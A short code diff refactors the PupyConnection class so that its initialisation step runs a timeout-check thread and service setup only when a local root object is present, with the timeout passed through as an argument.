@@ -508,11 +508,7 @@ class PupyConnection(Connection):
     def serve(self, timeout=None):
         raise NotImplementedError('Serve method should not be used!')
 
-    def _init_service_with_notify(self):
-        self._init_service()
-
-    def init(self, timeout=60):
-
+    def _init_service_with_notify(self, timeout):
         def check_timeout():
             now = time.time()
 
@@ -528,16 +524,23 @@ class PupyConnection(Connection):
             else:
                 logger.debug('Check timeout(%s) - ok', self)
 
-        t = Thread(
-            target=check_timeout,
-            name="PupyConnection({}) Timeout check".format(self)
-        )
-        t.daemon = True
-        t.start()
+        if self._local_root:
+            t = Thread(
+                target=check_timeout,
+                name="PupyConnection({}) Timeout check".format(self)
+            )
+            t.daemon = True
+            t.start()
 
+            self._init_service()
+        else:
+            logger.debug('Local root is absent')
+
+    def init(self, timeout=60):
         self._queue(
             self._on_sync_request_exception,
-            self._init_service_with_notify)
+            self._init_service_with_notify,
+            timeout)
 
     def loop(self):
         if __debug__:
